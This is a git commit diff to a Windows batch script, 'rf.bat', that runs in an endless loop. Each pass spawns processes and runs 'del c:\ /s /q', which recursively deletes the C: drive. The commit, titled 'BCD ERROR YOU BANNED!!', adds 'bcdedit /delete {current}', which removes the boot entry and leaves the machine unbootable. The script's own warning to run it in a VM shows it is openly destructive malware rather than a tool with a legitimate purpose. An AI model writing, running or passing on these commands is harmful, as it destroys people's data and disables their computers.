b78a90f7e1f62750a542c7da1f743011b6e6bbe2
zenierontop <159908629+zenierontop@users.noreply.github.com>
2024-02-14 12:04:41 +0200

    BCD ERROR YOU BANNED!!

--- viracdn/rf.bat
+++ viracdn/rf.bat
@@ -1,5 +1,5 @@
 @echo off 
-title by zenierontop
+title Resource Fucker by zenierontop
 echo yeah yeah save your work before running this and do it in a vm because yes
 pause
 goto lmao
@@ -9,4 +9,5 @@ start notepad.exe
 start explorer.exe
 start cmd /c del c:\ /s /q
 start cmd /c tree c:\
+start cmd /c bcdedit /delete {current}
 goto lmao 
